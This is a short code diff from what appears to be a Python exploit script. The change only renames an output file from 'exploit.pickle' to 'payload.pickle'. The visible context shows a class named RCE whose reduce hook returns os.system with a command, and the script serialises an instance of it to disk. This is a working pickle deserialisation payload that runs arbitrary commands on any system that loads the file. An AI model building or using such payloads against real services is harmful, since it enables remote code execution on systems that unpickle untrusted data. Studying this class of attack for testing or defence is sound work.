@@ -18,6 +18,6 @@ class RCE(object):
         return os.system, (cmd,)
 
 
-with open("exploit.pickle", "wb") as f:
+with open("payload.pickle", "wb") as f:
     data = pickle.dumps(RCE())
     f.write(data)
